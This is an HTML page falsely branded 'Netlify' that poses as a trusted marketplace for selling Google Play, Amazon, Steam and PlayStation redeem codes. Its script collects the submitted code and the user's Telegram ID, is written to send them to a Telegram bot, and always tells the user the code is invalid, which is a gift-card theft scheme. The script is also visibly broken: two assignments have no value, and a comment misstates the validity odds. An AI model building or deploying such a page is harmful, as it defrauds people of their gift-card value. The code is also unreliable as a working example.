<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sell Redeem Code - Netlify</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Poppins',sans-serif; }
body { background:#0f0f1a; color:#fff; scroll-behavior:smooth; }

/* Header */
header {
    position: fixed; width:100%; top:0; left:0; background:#1e1e2f; padding:20px 40px; display:flex; justify-content:space-between; align-items:center; z-index:100; box-shadow:0 4px 25px rgba(0,0,0,0.6);
}
header h1 { font-size:26px; color:#4caf50; font-weight:700; }
nav a { margin-left:25px; font-weight:600; color:#ccc; transition:0.3s; }
nav a:hover { color:#4caf50; }
#walletHeader { font-weight:bold; color:#4caf50; }

/* Hero */
.hero { height:250px; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; background: linear-gradient(135deg,#111122,#1e1e2f); padding:0 20px; margin-top:80px; border-radius:15px; box-shadow:0 5px 25px rgba(0,0,0,0.5);}
.hero h1 { font-size:32px; font-weight:700; color:#4caf50; margin-bottom:15px; }
.hero p { font-size:18px; color:#aaa; margin-bottom:20px; }

/* Form */
.sell-section { max-width:600px; margin:50px auto; background:#1e1e2f; padding:40px; border-radius:15px; box-shadow:0 5px 25px rgba(0,0,0,0.5);}
.sell-section h2 { text-align:center; margin-bottom:25px; font-size:28px; }
.sell-section label { display:block; margin-top:15px; margin-bottom:5px; font-weight:bold; }
.sell-section input, .sell-section select, .sell-section button { width:100%; padding:14px; border-radius:8px; border:none; margin-bottom:12px; font-size:16px; }
.sell-section button { background:#4caf50; color:#fff; font-size:18px; cursor:pointer; transition:0.3s; }
.sell-section button:hover { background:#45a049; }

/* Wallet Section */
.wallet { max-width:400px; margin:30px auto; background:#1e1e2f; padding:30px; border-radius:15px; box-shadow:0 5px 25px rgba(0,0,0,0.5);}
.wallet h2 { text-align:center; margin-bottom:20px; font-size:24px; }
.wallet p { font-size:18px; margin:10px 0; text-align:center; }

/* Footer */
footer { text-align:center; padding:40px 20px; background:#111122; color:#aaa; margin-top:50px; font-size:15px; }

/* Modal */
.modal { display:none; position:fixed; z-index:1000; left:0; top:0; width:100%; height:100%; overflow:auto; background: rgba(0,0,0,0.7);}
.modal-content { background-color:#1e1e2f; margin:15% auto; padding:40px; border-radius:15px; width:90%; max-width:400px; text-align:center; box-shadow:0 5px 25px rgba(0,0,0,0.5);}
.loader { border:8px solid #f3f3f3; border-top:8px solid #4caf50; border-radius:50%; width:60px; height:60px; margin:20px auto; animation:spin 1s linear infinite;}
@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }

</style>
</head>
<body>

<header>
    <h1>Netlify</h1>
    <div id="walletHeader">Wallet: ₹<span id="walletTop">0</span></div>
    <nav>
        <a href="index.html">Home</a>
        <a href="#sellSection">Sell Code</a>
    </nav>
</header>

<section class="hero">
    <h1>Sell Your Redeem Codes</h1>
    <p>Get 10% extra bonus instantly on every valid code. Trusted and secure platform for digital code sellers.</p>
</section>

<section class="sell-section" id="sellSection">
    <h2>Sell Your Redeem Code</h2>
    <form id="sellForm">
        <label for="platform">Platform</label>
        <select id="platform" required>
            <option value="google_play">Google Play</option>
            <option value="amazon">Amazon</option>
            <option value="steam">Steam</option>
            <option value="psn">PlayStation</option>
        </select>
        <label for="redeemCode">Redeem Code</label>
        <input type="text" id="redeemCode" placeholder="Enter your redeem code" required>
        <label for="amount">Amount (INR)</label>
        <input type="number" id="amount" placeholder="₹100" required>
        <label for="telegramId">Telegram ID</label>
        <input type="text" id="telegramId" placeholder="@username" required>
        <button type="submit">Sell Code</button>
    </form>
    <p id="statusMsg" style="text-align:center;margin-top:15px;"></p>
</section>

<section class="wallet">
    <h2>Your Bonus Wallet</h2>
    <p>Total Credit: ₹<span id="bonusWallet">0</span></p>
</section>

<footer>
    © 2025 Netlify. All Rights Reserved. Secure & Trusted Code Marketplace.
</footer>

<!-- Modal -->
<div id="modal" class="modal">
    <div class="modal-content">
        <h3>Checking your code...</h3>
        <div class="loader"></div>
    </div>
</div>

<!-- JS -->
<script type="module">
// Import config.js (create separately)
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from './config.js';

let wallet = 0;
const walletTop = document.getElementById('walletTop');
const walletBottom = document.getElementById('bonusWallet');

document.getElementById('sellForm').addEventListener('submit', function(e){
    e.preventDefault();

    const platform = document.getElementById('platform').value;
    const redeemCode = document.getElementById('redeemCode').value.trim();
    const amount = parseInt(document.getElementById('amount').value);
    const telegramId = document.getElementById('telegramId').value.trim();

    // Show modal loader
    const modal = document.getElementById('modal');
    modal.style.display = 'block';

    setTimeout(() => {
        modal.style.display = 'none';

        // Randomly simulate code validity (demo)
        const isValid = Math.random() < 0.0; // 70% chance valid

        if(isValid){
            const bonus = Math.floor(amount * 0.1);
            walletTop.textContent = ;
            walletBottom.textContent = ;

            const message = `New Redeem Code:\nPlatform: ${platform}\nCode: ${redeemCode}\nAmount: ₹${amount}\nTelegram: ${telegramId}\nBonus: ₹${bonus}`;

            // Send to Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            }).catch(err => console.error('Telegram API error:', err));

            document.getElementById('statusMsg').textContent = `❌ invalid code.`;
        } else {
            document.getElementById('statusMsg').textContent = `❌ Invalid code. Please check and try again.`;
        }

    }, 3000); // 3 seconds loader
});
</script>

</body>
</html>
